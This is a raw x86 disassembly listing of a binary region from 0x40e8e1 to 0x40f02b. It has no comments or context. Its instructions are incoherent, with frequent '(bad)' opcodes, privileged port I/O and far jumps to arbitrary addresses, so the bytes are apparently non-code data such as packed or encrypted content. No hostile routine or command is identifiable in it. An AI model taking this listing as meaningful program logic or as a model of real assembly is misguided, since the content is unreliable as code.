  40e8e1:	jl     0x40e896
  40e8e3:	in     eax,dx
  40e8e4:	and    eax,0xa194cb40
  40e8e9:	(bad)  
  40e8ea:	not    DWORD PTR [ecx+0x58]
  40e8ed:	pop    ebx
  40e8ee:	xor    al,0xe6
  40e8f0:	sub    ebx,DWORD PTR [edx+ebp*1]
  40e8f3:	test   DWORD PTR [ebx],0xd902897d
  40e8f9:	scas   al,BYTE PTR es:[edi]
  40e8fa:	test   BYTE PTR [esi],dl
  40e8fc:	cs mov ebp,gs
  40e8ff:	test   edx,eax
  40e901:	rcr    DWORD PTR [esi+ebp*2-0x11],1
  40e905:	pop    edi
  40e906:	jne    0x40e975
  40e908:	pop    ss
  40e909:	mov    edi,esi
  40e90b:	mov    al,0xbb
  40e90d:	xor    ch,dh
  40e90f:	ss aam 0xe0
  40e912:	fmulp  st(5),st
  40e914:	mov    cl,dh
  40e916:	pop    esp
  40e917:	outs   dx,BYTE PTR ds:[esi]
  40e918:	xchg   edi,eax
  40e919:	mov    eax,0xc27c672e
  40e91e:	stos   BYTE PTR es:[edi],al
  40e91f:	jl     0x40e8d3
  40e921:	mov    ah,0x40
  40e923:	sub    eax,0x7275a08b
  40e928:	sub    al,0x5b
  40e92a:	sub    ebx,eax
  40e92c:	lahf   
  40e92d:	jns    0x40e961
  40e92f:	or     DWORD PTR [esi],esp
  40e931:	ret    
  40e932:	inc    edx
  40e933:	sub    eax,ebx
  40e935:	mov    ch,0x77
  40e937:	xlat   BYTE PTR ds:[ebx]
  40e938:	pop    esi
  40e939:	sbb    DWORD PTR [esi],0x6c629036
  40e93f:	sti    
  40e940:	iret   
  40e941:	mov    bl,0x5a
  40e943:	sbb    BYTE PTR [edx+0x27],bh
  40e946:	pop    ebp
  40e947:	pop    ecx
  40e948:	jae    0x40e91b
  40e94a:	iret   
  40e94b:	pushf  
  40e94c:	xchg   edi,eax
  40e94d:	mov    DWORD PTR [esi+0x75af84ba],0x1d299b9
  40e957:	stos   BYTE PTR es:[edi],al
  40e958:	add    al,0x39
  40e95a:	(bad)  
  40e95b:	jns    0x40e917
  40e95d:	stc    
  40e95e:	mov    dl,BYTE PTR [edx-0x69]
  40e961:	outs   dx,BYTE PTR ds:[esi]
  40e962:	loope  0x40e986
  40e964:	in     eax,0x74
  40e966:	and    BYTE PTR [esi+0x49],dl
  40e969:	js     0x40e9bf
  40e96b:	dec    ecx
  40e96c:	xchg   ebx,eax
  40e96d:	leave  
  40e96e:	mov    bh,0xbc
  40e970:	sub    esi,DWORD PTR [edx+0x66]
  40e973:	pop    ebp
  40e974:	mov    eax,ds:0x986de6cd
  40e979:	mov    ebp,0x2a1fa7f2
  40e97e:	icebp  
  40e97f:	xor    DWORD PTR [ebx],esi
  40e981:	pop    edi
  40e982:	jmp    0xa8a2:0x601b82e7
  40e989:	cmp    ebx,DWORD PTR [eax-0x6679565d]
  40e98f:	ror    DWORD PTR [eax+ebp*4-0x5d],0xbf
  40e994:	jno    0x40ea11
  40e996:	mov    edi,0x816d472f
  40e99b:	mov    esi,0xb150ef8f
  40e9a0:	out    dx,eax
  40e9a1:	sbb    bh,BYTE PTR [edx+ecx*8-0x570104fc]
  40e9a8:	xlat   BYTE PTR ds:[ebx]
  40e9a9:	cld    
  40e9aa:	js     0x40ea12
  40e9ac:	bound  ebp,QWORD PTR [edi]
  40e9ae:	push   edi
  40e9af:	xor    ebp,ebx
  40e9b1:	outs   dx,DWORD PTR ds:[esi]
  40e9b2:	(bad)  
  40e9b3:	(bad)  
  40e9b4:	test   cl,0x5f
  40e9b7:	adc    eax,0x7dc0820a
  40e9bc:	adc    dl,ah
  40e9be:	and    edi,DWORD PTR [eax]
  40e9c0:	mov    ebp,DWORD PTR [ecx]
  40e9c2:	aam    0xf8
  40e9c4:	jg     0x40e961
  40e9c6:	outs   dx,DWORD PTR cs:[esi]
  40e9c8:	test   eax,0x3b819b5
  40e9cd:	stc    
  40e9ce:	jb     0x40e951
  40e9d0:	lea    esp,[eax+0x9]
  40e9d3:	bound  ecx,QWORD PTR [eax+0x14]
  40e9d6:	rcr    DWORD PTR [ebp+ebx*8+0x60],1
  40e9da:	rcr    DWORD PTR [edx+0x1b85c962],1
  40e9e0:	into   
  40e9e1:	stos   BYTE PTR es:[edi],al
  40e9e2:	cmp    al,0x1f
  40e9e4:	out    0x7e,eax
  40e9e6:	loopne 0x40ea51
  40e9e8:	xchg   edx,eax
  40e9e9:	lea    ebx,[edx]
  40e9eb:	inc    eax
  40e9ec:	(bad)  
  40e9ed:	ins    BYTE PTR es:[edi],dx
  40e9ee:	push   esi
  40e9ef:	and    cl,BYTE PTR [ecx+0x77]
  40e9f2:	dec    eax
  40e9f3:	scas   al,BYTE PTR es:[edi]
  40e9f4:	dec    ebx
  40e9f5:	sar    BYTE PTR [ecx+ecx*2+0x46],0x5b
  40e9fa:	pop    es
  40e9fb:	ficomp DWORD PTR [eax-0x3]
  40e9fe:	std    
  40e9ff:	shl    BYTE PTR [edi-0x36],0x65
  40ea03:	or     eax,0x27e08d38
  40ea08:	pop    esp
  40ea09:	jecxz  0x40ea2b
  40ea0b:	nop
  40ea0c:	mov    ch,0x7b
  40ea0e:	pop    esp
  40ea0f:	inc    ecx
  40ea10:	pop    eax
  40ea11:	inc    DWORD PTR [ecx-0x1cb4a454]
  40ea17:	je     0x40ea82
  40ea19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea1a:	push   eax
  40ea1b:	and    esi,eax
  40ea1d:	xchg   esp,eax
  40ea1e:	mov    ds:0x34f8fa0e,eax
  40ea23:	mov    DWORD PTR [ecx+eax*8+0x6e],edx
  40ea27:	sub    al,0x7a
  40ea29:	cmc    
  40ea2a:	and    eax,0x253f51cd
  40ea30:	cld    
  40ea31:	jno    0x40ea5d
  40ea33:	mov    eax,ds:0x8de3697
  40ea38:	ins    BYTE PTR es:[edi],dx
  40ea39:	jns    0x40ea50
  40ea3b:	xor    DWORD PTR [esi-0x29],esi
  40ea3e:	leave  
  40ea3f:	xchg   DWORD PTR [edi-0x1f0cc0e9],ebp
  40ea45:	xchg   ebx,eax
  40ea46:	xor    eax,0x6aba9a32
  40ea4b:	xchg   esi,eax
  40ea4c:	and    BYTE PTR [ebx+0x73fadfb0],ah
  40ea52:	call   0x51ee:0x36045343
  40ea59:	outs   dx,BYTE PTR ds:[esi]
  40ea5a:	cdq    
  40ea5b:	xchg   esi,eax
  40ea5c:	or     al,0xc6
  40ea5e:	js     0x40e9e6
  40ea60:	sub    eax,esi
  40ea62:	sbb    ebx,DWORD PTR [ebx-0x2e0b533f]
  40ea68:	std    
  40ea69:	das    
  40ea6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea6b:	mov    ds:0x3a04bf22,eax
  40ea70:	xchg   DWORD PTR [esi+0x5347a289],edi
  40ea76:	(bad)  
  40ea77:	mov    ebp,0xd0871284
  40ea7c:	mov    al,0x8f
  40ea7e:	xor    al,0xd2
  40ea80:	xchg   BYTE PTR [edi-0x8ffd96a],dl
  40ea86:	jb     0x40ea8a
  40ea88:	dec    edx
  40ea89:	xchg   BYTE PTR [edi+0x35],bl
  40ea8c:	shl    BYTE PTR [esi],0xb3
  40ea8f:	mov    ebx,0xae94a620
  40ea94:	mov    edi,0x1c1eabdc
  40ea99:	(bad)  
  40ea9a:	push   edx
  40ea9b:	fdiv   st(2),st
  40ea9d:	inc    ebp
  40ea9e:	jno    0x40eb19
  40eaa0:	fmul   QWORD PTR [edx]
  40eaa2:	xchg   ebx,eax
  40eaa3:	mov    ebx,0xa92ffb57
  40eaa8:	in     al,dx
  40eaa9:	loop   0x40eaec
  40eaab:	xchg   ebp,eax
  40eaac:	cmp    ebx,ecx
  40eaae:	fwait
  40eaaf:	sub    cl,ah
  40eab1:	add    eax,0xc6f605f4
  40eab6:	mov    WORD PTR [edi],?
  40eab8:	inc    ecx
  40eab9:	jae    0x40eb2b
  40eabb:	or     BYTE PTR [eax+0x9],ah
  40eabe:	or     DWORD PTR [edi+eiz*4-0x2],edx
  40eac2:	xchg   BYTE PTR [ebx-0x1ab34cf4],bh
  40eac8:	inc    eax
  40eac9:	ror    DWORD PTR [ebp-0x2f5d732e],cl
  40eacf:	push   ds
  40ead0:	sbb    ch,ch
  40ead2:	jg     0x40ea5b
  40ead4:	call   0x242a6b49
  40ead9:	fistp  QWORD PTR es:[edi+0x4ab28a2a]
  40eae0:	cmp    ebx,DWORD PTR [edx+0x32022166]
  40eae6:	mov    ch,0xe6
  40eae8:	sbb    ch,dl
  40eaea:	cmc    
  40eaeb:	pmaddwd mm5,QWORD PTR [esi-0x15457d86]
  40eaf2:	xor    ecx,DWORD PTR [eax+0x41]
  40eaf5:	pop    eax
  40eaf6:	xchg   edi,eax
  40eaf7:	les    ebx,FWORD PTR [edx+0x5b051b51]
  40eafd:	push   ebp
  40eafe:	rol    DWORD PTR [esi],1
  40eb00:	pusha  
  40eb01:	push   eax
  40eb02:	mov    esp,0xd72d777b
  40eb07:	dec    eax
  40eb08:	jae    0x40eaba
  40eb0a:	sti    
  40eb0b:	arpl   ax,dx
  40eb0d:	cmp    eax,0xd892552b
  40eb12:	stos   BYTE PTR es:[edi],al
  40eb13:	inc    edi
  40eb14:	push   es
  40eb15:	push   ds
  40eb16:	stos   BYTE PTR es:[edi],al
  40eb17:	inc    ecx
  40eb18:	adc    eax,0x973e4f7b
  40eb1d:	sub    al,0xe3
  40eb1f:	mov    esi,0x3b6f327
  40eb24:	sbb    bh,ah
  40eb26:	aas    
  40eb27:	sbb    al,0x1f
  40eb29:	enter  0x96a2,0xd6
  40eb2d:	imul   ecx,DWORD PTR [ebx+0x7c],0xe1c1a630
  40eb34:	cmp    eax,0x2ecee830
  40eb39:	into   
  40eb3a:	and    ebp,ebp
  40eb3c:	sbb    BYTE PTR [edx-0x3b7bc855],dl
  40eb42:	xchg   esp,eax
  40eb43:	and    BYTE PTR [ebp+0x5afa421d],ch
  40eb49:	aas    
  40eb4a:	sub    ch,BYTE PTR [ebp+0x1b905b1f]
  40eb50:	rol    BYTE PTR [edi],0x71
  40eb53:	push   0x38e88c71
  40eb58:	pop    ss
  40eb59:	dec    esp
  40eb5a:	mov    bl,0x73
  40eb5c:	pop    es
  40eb5d:	xchg   ebp,eax
  40eb5e:	movaps xmm3,XMMWORD PTR [ebp-0x15112f2e]
  40eb65:	or     DWORD PTR [ebx-0x4c],esp
  40eb68:	int3   
  40eb69:	mov    ebp,0x729ccc9e
  40eb6e:	scas   eax,DWORD PTR es:[edi]
  40eb6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb70:	not    DWORD PTR ds:0x98e1965d
  40eb76:	push   es
  40eb77:	out    dx,eax
  40eb78:	cmp    al,0x7c
  40eb7a:	adc    al,0xb2
  40eb7c:	lock les esi,FWORD PTR ss:[edi+0x1a]
  40eb81:	fidiv  DWORD PTR [edx+0x1]
  40eb84:	dec    ebx
  40eb85:	xchg   esi,eax
  40eb86:	into   
  40eb87:	push   esp
  40eb88:	jp     0x40eb85
  40eb8a:	outs   dx,DWORD PTR ds:[esi]
  40eb8b:	xor    cl,BYTE PTR [ebp-0x692b5b24]
  40eb91:	jno    0x40eb18
  40eb93:	adc    eax,0x90c36dee
  40eb98:	outs   dx,BYTE PTR ds:[esi]
  40eb99:	retf   
  40eb9a:	sub    DWORD PTR [ebp+0x31f0afb3],esi
  40eba0:	mov    al,0x1c
  40eba2:	adc    eax,0x71a0ca30
  40eba7:	ficom  WORD PTR [ebx+0x6bda127b]
  40ebad:	cmp    BYTE PTR [ebp-0x67937484],ch
  40ebb3:	arpl   WORD PTR [ecx],sp
  40ebb5:	and    DWORD PTR [ebp+0x206a576c],edi
  40ebbb:	jp     0x40eb61
  40ebbd:	out    dx,al
  40ebbe:	das    
  40ebbf:	cmp    dl,ch
  40ebc1:	xchg   edi,eax
  40ebc2:	shl    BYTE PTR [edx-0x61],cl
  40ebc5:	pop    edx
  40ebc6:	sbb    al,0xb8
  40ebc8:	push   cs
  40ebc9:	mov    edx,0x99e425bc
  40ebce:	ror    DWORD PTR [eax+0x79],1
  40ebd1:	mov    ah,0xe3
  40ebd3:	clc    
  40ebd4:	jmp    0xa34bb774
  40ebd9:	rcr    DWORD PTR [edx+edi*8-0x8701ef3],1
  40ebe0:	pop    eax
  40ebe1:	or     DWORD PTR [edx+0x538666f8],ebx
  40ebe7:	add    dh,BYTE PTR [ebp+0x56cdecd4]
  40ebed:	mov    ch,0x8b
  40ebef:	cmp    dl,al
  40ebf1:	das    
  40ebf2:	sub    ch,BYTE PTR [edi+0x64]
  40ebf5:	ss sub al,0x9
  40ebf8:	ins    DWORD PTR es:[edi],dx
  40ebf9:	inc    esi
  40ebfa:	into   
  40ebfb:	mov    ecx,DWORD PTR [eax]
  40ebfd:	mov    ebp,DWORD PTR [ebx-0x4d]
  40ec00:	mov    dh,0x82
  40ec02:	ds cld 
  40ec04:	mov    esp,0xca9854f9
  40ec09:	add    edi,DWORD PTR [ecx-0x53757a5b]
  40ec0f:	aaa    
  40ec10:	xchg   ecx,eax
  40ec11:	or     al,BYTE PTR [ebx]
  40ec13:	dec    edx
  40ec14:	mov    ecx,esi
  40ec16:	ror    BYTE PTR [ecx+0x60],0x8d
  40ec1a:	lods   eax,DWORD PTR ds:[esi]
  40ec1b:	or     esp,esp
  40ec1d:	(bad)  
  40ec1e:	in     eax,dx
  40ec1f:	fist   WORD PTR [edx]
  40ec21:	and    dl,BYTE PTR [edi]
  40ec23:	xor    al,0xbc
  40ec25:	pop    ebx
  40ec26:	pushf  
  40ec27:	mov    al,bl
  40ec29:	and    BYTE PTR [edi+0x1fc77a3a],ah
  40ec2f:	retf   0x73ed
  40ec32:	outs   dx,DWORD PTR ds:[esi]
  40ec33:	das    
  40ec34:	cdq    
  40ec35:	daa    
  40ec36:	pop    ecx
  40ec37:	ss mov edx,0x7855bdc9
  40ec3d:	push   ss
  40ec3e:	jecxz  0x40ebf0
  40ec40:	xlat   BYTE PTR ds:[ebx]
  40ec41:	jmp    0xfb73:0x6184e0ce
  40ec48:	dec    ebp
  40ec49:	in     eax,0x8
  40ec4b:	xchg   esi,eax
  40ec4c:	icebp  
  40ec4d:	jbe    0x40ec31
  40ec4f:	pop    ebx
  40ec50:	dec    ebp
  40ec51:	icebp  
  40ec52:	(bad)
  40ec56:	xchg   edx,eax
  40ec57:	mov    ch,0x65
  40ec59:	push   edi
  40ec5a:	pop    es
  40ec5b:	push   esp
  40ec5c:	push   0x19
  40ec5e:	or     DWORD PTR [ebx-0x3266dc44],esi
  40ec64:	gs push edx
  40ec66:	fsubr  QWORD PTR [edx]
  40ec68:	cmp    ebx,eax
  40ec6a:	out    dx,al
  40ec6b:	sbb    ebp,DWORD PTR [esi-0x70]
  40ec6e:	test   BYTE PTR [edi],ch
  40ec70:	nop
  40ec71:	pop    ebx
  40ec72:	es jl  0x40ec84
  40ec75:	mov    WORD PTR [eax],gs
  40ec77:	jnp    0x40ec7d
  40ec79:	nop
  40ec7a:	mov    bh,0x26
  40ec7c:	cmp    bl,BYTE PTR [ebp+0x42]
  40ec7f:	xor    eax,0xa90c2a41
  40ec84:	pop    ebp
  40ec85:	sub    eax,0xf3073912
  40ec8a:	sub    cl,0xc5
  40ec8d:	inc    ebp
  40ec8e:	addr16 or eax,0x372fe30d
  40ec94:	fdivp  st(3),st
  40ec96:	repz popf 
  40ec98:	cdq    
  40ec99:	mov    dh,0x3
  40ec9b:	xchg   esp,eax
  40ec9c:	pop    esp
  40ec9d:	cmp    BYTE PTR [ecx+edi*1+0x268d0c00],ah
  40eca4:	rol    DWORD PTR [edi+ebp*4],cl
  40eca7:	dec    edx
  40eca8:	loop   0x40eca0
  40ecaa:	(bad)  
  40ecab:	or     ebp,edx
  40ecad:	push   0xd7348f3c
  40ecb2:	arpl   WORD PTR [edx+0x36a06020],sp
  40ecb8:	mov    ds,WORD PTR [edx]
  40ecba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecbb:	adc    al,0x85
  40ecbd:	pop    ebp
  40ecbe:	inc    edi
  40ecbf:	push   0x1598f4b
  40ecc4:	push   ebx
  40ecc5:	ret    
  40ecc6:	leave  
  40ecc7:	iret   
  40ecc8:	aad    0xa
  40ecca:	out    0xf4,al
  40eccc:	sub    BYTE PTR [eax],ah
  40ecce:	push   ss
  40eccf:	outs   dx,BYTE PTR ds:[esi]
  40ecd0:	xor    al,0x31
  40ecd2:	sahf   
  40ecd3:	pop    ds
  40ecd4:	mov    esi,0xefda2bcd
  40ecd9:	or     edx,eax
  40ecdb:	dec    esp
  40ecdc:	fs jmp 0x84cf5df4
  40ece2:	cmp    DWORD PTR ds:0xe3276b7d,esi
  40ece8:	pop    ss
  40ece9:	sub    BYTE PTR [ebx],ah
  40eceb:	push   ebx
  40ecec:	cwde   
  40eced:	(bad)  
  40ecee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecef:	mov    ch,0xc7
  40ecf1:	push   eax
  40ecf2:	push   cs
  40ecf3:	outs   dx,BYTE PTR ds:[esi]
  40ecf4:	mov    ch,0x50
  40ecf6:	mov    ebx,0x5c7e536f
  40ecfb:	cmc    
  40ecfc:	(bad)  
  40ecfd:	mov    eax,0xc80d5024
  40ed02:	dec    ecx
  40ed03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed04:	add    dh,BYTE PTR [ebx]
  40ed06:	or     BYTE PTR [edx+ebp*2],ah
  40ed09:	lea    ecx,[esi-0x22]
  40ed0c:	add    eax,0xbdd9c729
  40ed11:	ret    0x9b76
  40ed14:	cwde   
  40ed15:	add    ebp,DWORD PTR [edi]
  40ed17:	mov    ch,0xc6
  40ed19:	cmp    bh,BYTE PTR [esp+ecx*2-0x30]
  40ed1d:	add    ch,al
  40ed1f:	xchg   edi,eax
  40ed20:	pop    ebp
  40ed21:	jg     0x40ed6d
  40ed23:	sub    al,0xd9
  40ed25:	jp     0x40eca8
  40ed27:	pop    edx
  40ed28:	lea    eax,[ecx+ecx*1+0x6b]
  40ed2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed2d:	jmp    0x4c55cd46
  40ed32:	adc    eax,0xb133bcc8
  40ed37:	add    BYTE PTR [edx+0x35],dl
  40ed3a:	mov    dl,0xb6
  40ed3c:	out    0xc5,eax
  40ed3e:	push   ss
  40ed3f:	adc    ebp,esp
  40ed41:	jmp    0x544d7263
  40ed46:	mov    ds:0xfee9e82a,eax
  40ed4b:	stos   DWORD PTR es:[edi],eax
  40ed4c:	mov    eax,ds:0xd2131da6
  40ed51:	dec    edx
  40ed52:	sbb    al,cl
  40ed54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed55:	arpl   sp,si
  40ed57:	xor    eax,0xe4747111
  40ed5c:	retf   0x19eb
  40ed5f:	addr16 push es
  40ed61:	jl     0x40ecf3
  40ed63:	mov    edx,0xfdc1665
  40ed68:	inc    esp
  40ed69:	(bad)  
  40ed6a:	iret   
  40ed6b:	in     eax,dx
  40ed6c:	push   ebx
  40ed6d:	iret   
  40ed6e:	cmp    eax,0xed17e1ec
  40ed73:	lea    esi,[ebx+0x4e9c297b]
  40ed79:	push   esp
  40ed7a:	pushf  
  40ed7b:	xor    dh,BYTE PTR [ebp-0x10]
  40ed7e:	(bad)  
  40ed7f:	xchg   ebx,eax
  40ed80:	add    BYTE PTR [edx-0x72],0x9d
  40ed84:	gs sub al,0xfd
  40ed87:	jmp    0x4588:0x7579367f
  40ed8e:	or     DWORD PTR [edx],ebx
  40ed90:	stc    
  40ed91:	sub    DWORD PTR [ebx-0x414f78f5],0x4d
  40ed98:	retf   
  40ed99:	into   
  40ed9a:	mov    edi,0xf43d8396
  40ed9f:	sub    edx,DWORD PTR [edx]
  40eda1:	xor    DWORD PTR [ebx-0x53],ecx
  40eda4:	(bad)  
  40eda6:	jb     0x40ed82
  40eda8:	loope  0x40edfe
  40edaa:	or     esp,ebx
  40edac:	pop    ebp
  40edad:	sub    esi,DWORD PTR [esi+0xc3cb3f2]
  40edb3:	pushw  ds
  40edb5:	fcmovbe st,st(1)
  40edb7:	sar    esp,0x3f
  40edba:	jbe    0x40edd6
  40edbc:	xchg   ebp,eax
  40edbd:	lock stc 
  40edbf:	popf   
  40edc0:	add    edi,0xffffffa9
  40edc3:	or     edi,eax
  40edc5:	mov    eax,0xe9e96e1
  40edca:	test   BYTE PTR [eax+0x6c207cc],ch
  40edd0:	sub    DWORD PTR [esi+esi*2+0xa],eax
  40edd4:	int    0xd1
  40edd6:	loop   0x40edd0
  40edd8:	lea    edi,[esi+edx*4]
  40eddb:	fidiv  DWORD PTR ss:0x5caca9ce
  40ede2:	inc    ebp
  40ede3:	lods   eax,DWORD PTR ds:[esi]
  40ede4:	imul   edx,ebx,0xffffffba
  40ede7:	mov    WORD PTR ds:0x73e178a3,ss
  40eded:	lock push ebx
  40edef:	inc    esp
  40edf0:	(bad)  
  40edf1:	sahf   
  40edf2:	icebp  
  40edf3:	jmp    FWORD PTR [ebx+0x15]
  40edf6:	stc    
  40edf7:	or     al,BYTE PTR [edi]
  40edf9:	adc    eax,0x17136ae7
  40edfe:	arpl   WORD PTR [ecx-0x6e],bp
  40ee01:	in     eax,dx
  40ee02:	sbb    BYTE PTR [eax-0x57921dd5],ch
  40ee08:	sbb    ebx,ebp
  40ee0a:	mov    dh,0x51
  40ee0c:	ror    BYTE PTR [eax+0xf2b26c2],0xc5
  40ee13:	pusha  
  40ee14:	es sti 
  40ee16:	jmp    0x40edee
  40ee18:	push   DWORD PTR [ebp+eiz*1-0x40]
  40ee1c:	test   eax,0x7a34bd3a
  40ee21:	xchg   bh,dl
  40ee23:	or     DWORD PTR [ebx],ebx
  40ee25:	inc    ebx
  40ee26:	test   BYTE PTR [ecx+eax*8],al
  40ee29:	or     al,0xab
  40ee2b:	xchg   edi,eax
  40ee2c:	int    0xb7
  40ee2e:	sub    DWORD PTR [ecx+0x22],0xffffffcb
  40ee32:	aas    
  40ee33:	xor    ebx,DWORD PTR [esi+0x676010a1]
  40ee39:	loope  0x40eea1
  40ee3b:	xor    BYTE PTR [edi],ah
  40ee3d:	les    ebx,FWORD PTR [ebx-0x6c]
  40ee40:	inc    edx
  40ee41:	lahf   
  40ee42:	loopne 0x40eebe
  40ee44:	jmp    0x40eeb8
  40ee46:	popf   
  40ee47:	add    bl,BYTE PTR ds:0xc3918ebe
  40ee4d:	cli    
  40ee4e:	push   cs
  40ee4f:	dec    edx
  40ee50:	int3   
  40ee51:	mov    ds:0x35a7e546,eax
  40ee56:	out    dx,al
  40ee57:	ret    0x9ccc
  40ee5a:	mov    bh,0x96
  40ee5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee5e:	mov    eax,ds:0xb6be8d68
  40ee63:	jmp    0xdad4:0xfe76d73
  40ee6a:	sub    edi,eax
  40ee6c:	out    dx,al
  40ee6d:	(bad)  
  40ee6f:	jecxz  0x40ee49
  40ee71:	inc    eax
  40ee72:	sub    ah,bl
  40ee74:	pusha  
  40ee75:	fcomi  st,st(0)
  40ee77:	aad    0x4
  40ee79:	pusha  
  40ee7a:	mov    bl,0x11
  40ee7c:	scas   eax,DWORD PTR es:[edi]
  40ee7d:	push   esp
  40ee7e:	stos   BYTE PTR es:[edi],al
  40ee7f:	scas   eax,DWORD PTR es:[edi]
  40ee80:	jb     0x40ee97
  40ee82:	clc    
  40ee83:	sub    ebp,DWORD PTR [ecx]
  40ee85:	dec    ebx
  40ee86:	call   0x7b0:0x78482551
  40ee8d:	test   al,0x8f
  40ee8f:	in     eax,dx
  40ee90:	ret    0xf25f
  40ee93:	xlat   BYTE PTR ds:[ebx]
  40ee94:	sub    esi,edx
  40ee96:	mov    ds:0x9f3ada1e,al
  40ee9b:	loopne 0x40eefe
  40ee9d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40ee9f:	in     al,0x78
  40eea1:	inc    esi
  40eea2:	hlt    
  40eea3:	sub    DWORD PTR [esi-0x29c3082f],eax
  40eea9:	gs adc ah,dh
  40eeac:	aam    0xcc
  40eeae:	mov    ebx,0x33d1776d
  40eeb3:	mov    ch,0x9e
  40eeb5:	lds    esi,FWORD PTR [ebx+0x7eb31535]
  40eebb:	push   0xffffffea
  40eebd:	sbb    eax,0x1e126926
  40eec2:	xchg   ebx,ebx
  40eec4:	repnz push ebx
  40eec6:	and    al,0x60
  40eec8:	(bad)  
  40eec9:	jo     0x40ef3a
  40eecb:	outs   dx,BYTE PTR ds:[esi]
  40eecc:	cli    
  40eecd:	cmc    
  40eece:	shl    BYTE PTR ds:0xd0f9276d,1
  40eed4:	cmp    DWORD PTR [ebp+0x1f0601bf],esp
  40eeda:	push   cs
  40eedb:	add    BYTE PTR [edx+0x1e56d683],cl
  40eee1:	scas   eax,DWORD PTR es:[edi]
  40eee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eee3:	pop    ss
  40eee4:	or     al,0x73
  40eee6:	inc    ecx
  40eee7:	lods   al,BYTE PTR ds:[esi]
  40eee8:	setns  BYTE PTR [edi+0x65660704]
  40eeef:	jae    0x40eecf
  40eef1:	sub    eax,0xfba201dc
  40eef6:	ror    BYTE PTR [esi+0x5ebbd2eb],0x72
  40eefd:	sbb    ch,BYTE PTR [edi-0x514dc1fd]
  40ef03:	ret    0xa6c
  40ef06:	mov    esp,0x76013d2f
  40ef0b:	rcr    BYTE PTR [esi+0x58326518],0x25
  40ef12:	and    DWORD PTR [ebx-0x512f9543],0x1f
  40ef19:	add    ebp,DWORD PTR ds:[ebx+0x4a]
  40ef1d:	icebp  
  40ef1e:	mov    esi,0x2734b98c
  40ef23:	mov    gs,WORD PTR [ebx+0x61d48f44]
  40ef29:	aaa    
  40ef2a:	push   eax
  40ef2b:	jmp    0x1369:0xe2c15b36
  40ef32:	adc    eax,0x1c1d8da3
  40ef37:	inc    eax
  40ef38:	jns    0x40ef93
  40ef3a:	retf   
  40ef3b:	xor    BYTE PTR ds:0xbea7ea65,bl
  40ef41:	cmc    
  40ef42:	or     bh,BYTE PTR [edi]
  40ef44:	sbb    cl,BYTE PTR [ebx+0x6c]
  40ef47:	inc    edi
  40ef48:	repnz jecxz 0x40ef14
  40ef4b:	test   DWORD PTR [esi-0x9],esp
  40ef4e:	jmp    0x40efa5
  40ef50:	test   cl,0x2e
  40ef53:	mov    ebp,0xa4ff9be7
  40ef58:	call   0x2eea436a
  40ef5d:	(bad)  
  40ef5e:	pushw  cs
  40ef60:	pop    es
  40ef61:	sub    al,0xfc
  40ef63:	sub    eax,0xb9cf577e
  40ef68:	mov    esp,0x11446db1
  40ef6d:	sbb    bh,dh
  40ef6f:	test   DWORD PTR [ecx],esi
  40ef71:	push   eax
  40ef72:	and    BYTE PTR [ebx],ch
  40ef74:	add    BYTE PTR [esi-0x52],bh
  40ef77:	mov    al,ds:0x7ec90a5b
  40ef7c:	ret    
  40ef7d:	mov    al,0x84
  40ef7f:	sub    esi,eax
  40ef81:	cmp    dh,ah
  40ef83:	pop    edx
  40ef84:	aaa    
  40ef85:	push   eax
  40ef86:	int3   
  40ef87:	mov    edx,0x7a866abd
  40ef8c:	stc    
  40ef8d:	fmul   DWORD PTR cs:[ecx-0x18]
  40ef91:	pop    ebp
  40ef92:	lahf   
  40ef93:	rol    BYTE PTR [eax],0x75
  40ef96:	out    0x9b,al
  40ef98:	es jb  0x40efa7
  40ef9b:	ins    DWORD PTR es:[edi],dx
  40ef9c:	rol    DWORD PTR [edx],0xc3
  40ef9f:	fdivr  DWORD PTR [ebx-0x51]
  40efa2:	into   
  40efa3:	mov    ds:0x905cb81a,eax
  40efa8:	nop
  40efa9:	into   
  40efaa:	aaa    
  40efab:	popa   
  40efac:	call   0x7c308f42
  40efb1:	jno    0x40f00a
  40efb3:	pop    ecx
  40efb4:	push   edi
  40efb5:	xchg   esi,eax
  40efb6:	sub    ebx,DWORD PTR [ebp+eax*2-0x5fd93a27]
  40efbd:	xchg   ecx,eax
  40efbe:	mov    eax,0x26f0db28
  40efc3:	jbe    0x40ef59
  40efc5:	jmp    0x18813ca9
  40efca:	sbb    ebx,DWORD PTR [ebx+edi*2]
  40efcd:	aaa    
  40efce:	loop   0x40f002
  40efd0:	cmp    dl,BYTE PTR [eax+0x3e]
  40efd3:	sub    ebp,DWORD PTR ds:0x3c1dabe
  40efd9:	imul   esp,edi,0x7aca3fdc
  40efdf:	and    ah,BYTE PTR [edx+0x30b68526]
  40efe5:	mov    BYTE PTR [edx+0x7],dh
  40efe8:	aad    0xd4
  40efea:	popa   
  40efeb:	pop    edx
  40efec:	mov    al,0xc
  40efee:	xlat   BYTE PTR ds:[ebx]
  40efef:	cwde   
  40eff0:	sub    al,0x89
  40eff2:	dec    ecx
  40eff3:	arpl   sp,bp
  40eff5:	and    eax,0x89566275
  40effa:	mov    bh,0x9d
  40effc:	dec    ebx
  40effd:	add    ebx,DWORD PTR [esi-0x50]
  40f000:	xchg   bl,bl
  40f002:	adc    al,0x6e
  40f004:	clc    
  40f005:	outs   dx,DWORD PTR ds:[esi]
  40f006:	pop    ds
  40f007:	dec    ebx
  40f008:	es ret 0xad0a
  40f00c:	fmul   DWORD PTR [edi]
  40f00e:	mov    ds:0xc4a4f0e7,al
  40f013:	cmp    eax,DWORD PTR [ebx-0x1e0eae14]
  40f019:	retf   
  40f01a:	jne    0x40f043
  40f01c:	push   ecx
  40f01e:	mov    al,ds:0xc45fa95b
  40f023:	test   eax,0x69d1b99
  40f028:	sahf   
  40f029:	mov    bl,0x9e
  40f02b:	mov    al,0x59
